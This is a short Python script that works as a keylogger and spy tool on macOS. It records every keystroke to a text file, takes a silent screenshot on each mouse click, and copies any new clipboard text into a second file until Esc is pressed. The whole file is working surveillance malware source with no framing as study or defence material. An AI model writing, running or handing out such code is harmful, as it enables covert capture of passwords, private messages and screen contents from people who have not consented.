from time import sleep
from pynput import keyboard, mouse
from richxerox import *
import os
import subprocess
import sys

log_file = open("log.txt", "w")
clipboard_file = open("clipboard.txt", "w")

def on_press(key):
    try:
        if key == keyboard.Key.space:
            log_file.write(" ")
        elif key == keyboard.Key.backspace:
            log_file.seek(0, os.SEEK_END) # Move the cursor to the end of the log_file
            pos = log_file.tell() # Get the current position of the cursor
            if pos > 0:
                log_file.seek(pos - 1)
                log_file.truncate() # Delete the last character
        elif key == keyboard.Key.esc:
            pass
        else:
            log_file.write(key.char)
    except AttributeError:
        log_file.write("[" + str(key) + "]")
        
def on_release(key):
    if key == keyboard.Key.esc:
        return False
    
def on_click(x, y, button, pressed):
    try:
        subprocess.check_output([outcmd], shell=True)
    except subprocess.CalledProcessError as e:
        print('Error: [%d]\n{}\n'.format(e.returncode, e.output))
folder = os.path.join(os.getcwd(), 'screenshot_folder')
if os.path.isdir(folder) == False:
    os.mkdir(folder)
outfile = os.path.join(folder, 'screenshot.png')
outcmd = "{} {} {}".format('screencapture', '-x', outfile)
    
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener2 = mouse.Listener(on_click=on_click)
listener2.start()
listener.start()
        
text = None
while (listener.is_alive()):
    sleep(1)
    if (text == paste(format='text')):
        continue
    text = paste(format='text')
    clipboard_file.write(text+"\n")
log_file.close()
clipboard_file.close()